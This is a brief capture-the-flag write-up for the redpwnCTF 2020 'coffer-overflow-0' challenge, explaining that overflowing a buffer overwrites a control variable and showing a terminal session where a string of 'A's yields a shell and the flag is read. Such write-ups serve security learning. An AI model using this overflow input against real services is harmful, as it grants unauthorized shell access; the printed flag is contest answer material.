### Challenge
```
Can you fill up the coffers? We even managed to find the source for you.

nc 2020.redpwnc.tf 31199
```

### Solve
* Just need to make the variable code != 0, so just overflow to overwrite the variable with a different value than 0 and get shell
```
root@beeBeeEight:~# nc 2020.redpwnc.tf 31199
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
AAAAAAAAAAAAAAAAAAAAAAAAA
ls
Makefile
bin
coffer-overflow-0
coffer-overflow-0.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{b0ffer_0verf10w_3asy_as_123}
^C
```